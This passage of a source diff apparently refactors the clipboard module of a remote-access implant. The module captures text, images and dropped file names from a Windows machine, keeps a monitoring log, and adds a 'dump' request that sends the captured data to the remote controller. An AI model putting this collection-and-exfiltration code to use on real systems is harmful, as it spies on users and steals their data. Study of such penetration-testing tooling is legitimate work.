-						packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG, imageTlv, 2);
-					}
-					else
-					{
-						lpDIB = ((PUCHAR)lpBI) + get_bitmapinfo_size(lpBI, TRUE);
-
-						// TODO: add the ability to encode with multiple encoders and return the smallest image.
-						if (convert_to_jpg(lpBI, lpDIB, 75, &image) == ERROR_SUCCESS)
-						{
-							dprintf("[EXTAPI CLIPBOARD] Clipboard bitmap captured to image: %p, Size: %u bytes", image.pImageBuffer, image.dwImageBufferSize);
-							imageTlv[2].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DATA;
-							imageTlv[2].header.length = image.dwImageBufferSize;
-							imageTlv[2].buffer = (PUCHAR)image.pImageBuffer;
-
-							packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG, imageTlv, 3);
-
-							// Just leaving this in for debugging purposes later on
-							//hSourceFile = CreateFileA("C:\\temp\\foo.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-							//WriteFile(hSourceFile, image.pImageBuffer, image.dwImageBufferSize, &largeInt.LowPart, NULL);
-							//CloseHandle(hSourceFile);
-
-							free(image.pImageBuffer);
-						}
-						else
-						{
-							dwResult = GetLastError();
-							dprintf("[EXTAPI CLIPBOARD] Failed to convert clipboard image to JPG");
-						}
-					}
-
-					pGlobalUnlock(hClipboardData);
-				}
-				else
-				{
-					dwResult = GetLastError();
-					dprintf("[EXTAPI CLIPBOARD] Failed to get access to the CF_DIB information");
-				}
-			}
-			else if (uFormat == CF_HDROP) {
-				// there's one or more files on the clipboard
-				dprintf("[EXTAPI CLIPBOARD] Files have been located on the clipboard");
-				do
-				{
-					dprintf("[EXTAPI CLIPBOARD] Loading shell32.dll");
-					if ((hShell32 = LoadLibraryA("shell32.dll")) == NULL)
-					{
-						BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load shell32.dll");
-					}
-
-					dprintf("[EXTAPI CLIPBOARD] Searching for CreateFileA");
-					if ((pCreateFileA = (PCREATEFILEA)GetProcAddress(hKernel32, "CreateFileA")) == NULL)
-					{
-						BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CreateFileA in kernel32.dll");
-					}
-
-					dprintf("[EXTAPI CLIPBOARD] Searching for CloseHandle");
-					if ((pCloseHandle = (PCLOSEHANDLE)GetProcAddress(hKernel32, "CloseHandle")) == NULL)
-					{
-						BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseHandle in kernel32.dll");
-					}
-
-					dprintf("[EXTAPI CLIPBOARD] Searching for GetFileSizeEx");
-					if ((pGetFileSizeEx = (PGETFILESIZEEX)GetProcAddress(hKernel32, "GetFileSizeEx")) == NULL)
-					{
-						BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GetFileSizeEx in kernel32.dll");
-					}
-
-					dprintf("[EXTAPI CLIPBOARD] Searching for DragQueryFileA");
-					if ((pDragQueryFileA = (PDRAGQUERYFILEA)GetProcAddress(hShell32, "DragQueryFileA")) == NULL)
-					{
-						BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseClipboard in shell32.dll");
-					}
-
-					dprintf("[EXTAPI CLIPBOARD] Grabbing the clipboard file drop data");
-					if ((hClipboardData = pGetClipboardData(CF_HDROP)) != NULL
-						&& (hFileDrop = (HDROP)pGlobalLock(hClipboardData)) != NULL)
-					{
-						uFileCount = pDragQueryFileA(hFileDrop, (UINT)-1, NULL, 0);
-
-						dprintf("[EXTAPI CLIPBOARD] Parsing %u file(s) on the clipboard.", uFileCount);
-
-						for (uFileIndex = 0; uFileIndex < uFileCount; ++uFileIndex)
-						{
-							if (pDragQueryFileA(hFileDrop, uFileIndex, lpFileName, sizeof(lpFileName)))
-							{
-								dprintf("[EXTAPI CLIPBOARD] Clipboard file entry: %s", lpFileName);
-
-								memset(&entries, 0, sizeof(entries));
-								memset(&largeInt, 0, sizeof(largeInt));
-
-								entries[0].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME;
-								entries[0].header.length = (DWORD)strlen(lpFileName) + 1;
-								entries[0].buffer = (PUCHAR)lpFileName;
-
-								entries[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_SIZE;
-								entries[1].header.length = sizeof(QWORD);
-								entries[1].buffer = (PUCHAR)&largeInt.QuadPart;
-
-								if ((hSourceFile = pCreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != NULL)
-								{
-									if (pGetFileSizeEx(hSourceFile, &largeInt))
-									{
-										largeInt.QuadPart = htonq(largeInt.QuadPart);
-									}
-
-									pCloseHandle(hSourceFile);
-								}
-
-								packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE, entries, 2);
-							}
-						}
-
-						pGlobalUnlock(hClipboardData);
-					}
-
-				} while (0);
-			}
-		}
+		free(pCapture);
 
 		dwResult = GetLastError();
-
-		pCloseClipboard();
-
 	} while (0);
-
-	if (hShell32)
-	{
-		FreeLibrary(hShell32);
-	}
-
-	if (hKernel32)
-	{
-		FreeLibrary(hKernel32);
-	}
-
-	if (hUser32)
-	{
-		FreeLibrary(hUser32);
-	}
 
 	if (pResponse)
 	{
+		dprintf("[EXTAPI CLIPBOARD] sending response");
 		packet_transmit_response(dwResult, remote, pResponse);
 	}
 
@@ -535,19 +840,6 @@ DWORD request_clipboard_set_data(Remote *remote, Packet *packet)
 {
 #ifdef _WIN32
 	DWORD dwResult;
-	HMODULE hKernel32 = NULL;
-	HMODULE hUser32 = NULL;
-
-	PGLOBALALLOC pGlobalAlloc = NULL;
-	PGLOBALFREE pGlobalFree = NULL;
-	PGLOBALLOCK pGlobalLock = NULL;
-	PGLOBALUNLOCK pGlobalUnlock = NULL;
-
-	POPENCLIPBOARD pOpenClipboard = NULL;
-	PCLOSECLIPBOARD pCloseClipboard = NULL;
-	PSETCLIPBOARDDATA pSetClipboardData = NULL;
-	PEMPTYCLIPBOARD pEmptyClipboard = NULL;
-
 	PCHAR lpClipString;
 	HGLOBAL hClipboardData;
 	PCHAR lpLockedData;
@@ -555,61 +847,15 @@ DWORD request_clipboard_set_data(Remote *remote, Packet *packet)
 
 	do
 	{
+		dprintf("[EXTAPI CLIPBOARD] Checking to see if we loaded OK");
+		if (!gClipboardInitialised)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Clipboard failed to initialise, unable to get data");
+		}
+
 		if ((lpClipString = packet_get_tlv_value_string(packet, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT)) == NULL)
 		{
 			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] No string data specified", ERROR_INVALID_PARAMETER);
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Loading user32.dll");
-		if ((hUser32 = LoadLibraryA("user32.dll")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load user32.dll");
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Loading kernel32.dll");
-		if ((hKernel32 = LoadLibraryA("kernel32.dll")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load kernel32.dll");
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalAlloc");
-		if ((pGlobalAlloc = (PGLOBALALLOC)GetProcAddress(hKernel32, "GlobalAlloc")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalAlloc in kernel32.dll");
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalLock");
-		if ((pGlobalLock = (PGLOBALLOCK)GetProcAddress(hKernel32, "GlobalLock")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalLock in kernel32.dll");
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalUnlock");
-		if ((pGlobalUnlock = (PGLOBALUNLOCK)GetProcAddress(hKernel32, "GlobalUnlock")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalUnlock in kernel32.dll");
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Searching for OpenClipboard");
-		if ((pOpenClipboard = (POPENCLIPBOARD)GetProcAddress(hUser32, "OpenClipboard")) == NULL)
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate OpenClipboard in user32.dll");
-
-		dprintf("[EXTAPI CLIPBOARD] Searching for CloseClipboard");
-		if ((pCloseClipboard = (PCLOSECLIPBOARD)GetProcAddress(hUser32, "CloseClipboard")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseClipboard in user32.dll");
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Searching for EmptyClipboard");
-		if ((pEmptyClipboard = (PEMPTYCLIPBOARD)GetProcAddress(hUser32, "EmptyClipboard")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate EmptyClipboard in user32.dll");
-		}
-
-		dprintf("[EXTAPI CLIPBOARD] Searching for SetClipboardData");
-		if ((pSetClipboardData = (PSETCLIPBOARDDATA)GetProcAddress(hUser32, "SetClipboardData")) == NULL)
-		{
-			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate SetClipboardData in user32.dll");
 		}
 
 		cbStringBytes = (SIZE_T)strlen(lpClipString) + 1;
@@ -645,7 +891,8 @@ DWORD request_clipboard_set_data(Remote *remote, Packet *packet)
 			dwResult = GetLastError();
 			dprintf("[EXTAPI CLIPBOARD] Failed to set the clipboad data: %u", dwResult);
 		}
-		else {
+		else
+		{
 			dwResult = ERROR_SUCCESS;
 		}
 
@@ -657,21 +904,7 @@ DWORD request_clipboard_set_data(Remote *remote, Packet *packet)
 	// free it up because the clipboard can't do it for us.
 	if (dwResult != ERROR_SUCCESS && hClipboardData != NULL)
 	{
-		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalFree");
-		if ((pGlobalFree = (PGLOBALFREE)GetProcAddress(hKernel32, "GlobalFree")) != NULL)
-		{
-			pGlobalFree(hClipboardData);
-		}
-	}
-
-	if (hKernel32)
-	{
-		FreeLibrary(hKernel32);
-	}
-
-	if (hUser32)
-	{
-		FreeLibrary(hUser32);
+		pGlobalFree(hClipboardData);
 	}
 
 	packet_transmit_empty_response(remote, packet, dwResult);
@@ -711,6 +944,7 @@ DWORD THREADCALL clipboard_monitor_thread_func(THREAD * thread)
 
 		waitableHandles[0] = thread->sigterm->handle;
 		waitableHandles[1] = pState->hPauseEvent->handle;
+		waitableHandles[2] = pState->hResumeEvent->handle;
 
 		while (!bTerminate)
 		{
@@ -725,26 +959,14 @@ DWORD THREADCALL clipboard_monitor_thread_func(THREAD * thread)
 			case 1: // pause the thread
 				dprintf("[EXTAPI CLIPBOARD] Thread paused");
 				pState->bRunning = FALSE;
-
 				// indicate that we've paused
 				event_signal(pState->hResponseEvent);
-
-				// wait to be told to continue, but keep pumping messages while we wait
-				// because these are the messages we're ignoring.
-				while (!event_poll(pState->hResumeEvent, 1))
-				{
-					if (pState->hClipboardWindow && PeekMessageA(&msg, pState->hClipboardWindow, 0, 0, PM_REMOVE))
-					{
-						TranslateMessage(&msg);
-						DispatchMessageA(&msg);
-					}
-				}
-
-				// indicate that we've resumed
-				pState->bRunning = TRUE;
-				event_signal(pState->hResponseEvent);
-
+				break;
+			case 2: // resume the thread
 				dprintf("[EXTAPI CLIPBOARD] Thread resumed");
+				pState->bRunning = TRUE;
+				// indicate that we've resumed
+				event_signal(pState->hResponseEvent);
 				break;
 			default:
 				// timeout, so pump messages
@@ -792,6 +1014,7 @@ VOID destroy_clipboard_monitor_state(ClipboardState* pState)
 		{
 			event_destroy(pState->hResponseEvent);
 		}
+		destroy_clipboard_monitor_capture(&pState->captureList, TRUE);
 
 		free(pState);
 	}
@@ -806,6 +1029,12 @@ DWORD request_clipboard_monitor_start(Remote *remote, Packet *packet)
 
 	do
 	{
+		dprintf("[EXTAPI CLIPBOARD] Checking to see if we loaded OK");
+		if (!gClipboardInitialised)
+		{
+			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Clipboard failed to initialise, unable to get data");
+		}
+
 		if (gClipboardState != NULL)
 		{
 			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread already running", ERROR_ALREADY_INITIALIZED);
@@ -831,12 +1060,12 @@ DWORD request_clipboard_monitor_start(Remote *remote, Packet *packet)
 		strncpy_s(pState->cbWindowClass, sizeof(pState->cbWindowClass), lpClassName, sizeof(pState->cbWindowClass) - 1);
 		dprintf("[EXTAPI CLIPBOARD] Class Name set to %s", pState->cbWindowClass);
 
-		pState->bDownloadFiles = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_DOWNLOAD_FILES);
-		pState->bDownloadImages = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_DOWNLOAD_IMAGES);
+		pState->bCaptureImageData = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAPTURE_IMG_DATA);
 
 		pState->hPauseEvent = event_create();
 		pState->hResumeEvent = event_create();
 		pState->hResponseEvent = event_create();
+		pState->captureList.pClipboardCaptureLock = lock_create();
 
 		if (pState->hPauseEvent == NULL
 			|| pState->hResumeEvent == NULL
@@ -909,7 +1138,7 @@ DWORD request_clipboard_monitor_pause(Remote *remote, Packet *packet)
 	{
 		if (gClipboardState == NULL)
 		{
-			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOTHING_TO_TERMINATE);
+			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
 		}
 
 		dprintf("[EXTAPI CLIPBOARD] Pausing clipboard monitor");
@@ -934,7 +1163,7 @@ DWORD request_clipboard_monitor_resume(Remote *remote, Packet *packet)
 	{
 		if (gClipboardState == NULL)
 		{
-			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOTHING_TO_TERMINATE);
+			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
 		}
 
 		dprintf("[EXTAPI CLIPBOARD] Resuming clipboard monitor");
@@ -954,6 +1183,9 @@ DWORD request_clipboard_monitor_stop(Remote *remote, Packet *packet)
 {
 #ifdef _WIN32
 	DWORD dwResult = ERROR_SUCCESS;
+	BOOL bDump = TRUE;
+	BOOL bIncludeImages = TRUE;
+	Packet *pResponse = packet_create_response(packet);
 
 	do
 	{
@@ -962,10 +1194,9 @@ DWORD request_clipboard_monitor_stop(Remote *remote, Packet *packet)
 			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOTHING_TO_TERMINATE);
 		}
 
-		dprintf("[EXTAPI CLIPBOARD] Starting clipboard monitor");
-
-		// resume in case we're paused
-		clipboard_monitor_resume(gClipboardState);
+		dprintf("[EXTAPI CLIPBOARD] Stopping clipboard monitor");
+		bDump = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_DUMP);
+		bIncludeImages = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAPTURE_IMG_DATA);
 
 		// now stop the show
 		event_signal(gClipboardState->hThread->sigterm);
@@ -977,13 +1208,48 @@ DWORD request_clipboard_monitor_stop(Remote *remote, Packet *packet)
 			dprintf("[EXTAPI CLIPBOARD] Brutally terminating the thread for not responding fast enough");
 			thread_kill(gClipboardState->hThread);
 		}
+		
+		if (bDump)
+		{
+			dump_clipboard_capture_list(pResponse, &gClipboardState->captureList, bIncludeImages, TRUE);
+		}
 
 		destroy_clipboard_monitor_state(gClipboardState);
 		gClipboardState = NULL;
 		dwResult = ERROR_SUCCESS;
 	} while (0);
 
-	packet_transmit_empty_response(remote, packet, dwResult);
+	packet_transmit_response(dwResult, remote, pResponse);
+
+	return dwResult;
+#else
+	return ERROR_NOT_SUPPORTED;
+#endif
+}
+
+DWORD request_clipboard_monitor_dump(Remote *remote, Packet *packet)
+{
+#ifdef _WIN32
+	DWORD dwResult = ERROR_SUCCESS;
+	BOOL bIncludeImages = TRUE;
+	BOOL bPurge = TRUE;
+	Packet *pResponse = packet_create_response(packet);
+
+	do
+	{
+		if (gClipboardState == NULL)
+		{
+			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
+		}
+		bIncludeImages = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAPTURE_IMG_DATA);
+		bPurge = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_PURGE);
+
+		dump_clipboard_capture_list(pResponse, &gClipboardState->captureList, bIncludeImages, bPurge);
+
+		dwResult = ERROR_SUCCESS;
+	} while (0);
+
+	packet_transmit_response(dwResult, remote, pResponse);
 
 	return dwResult;
 #else
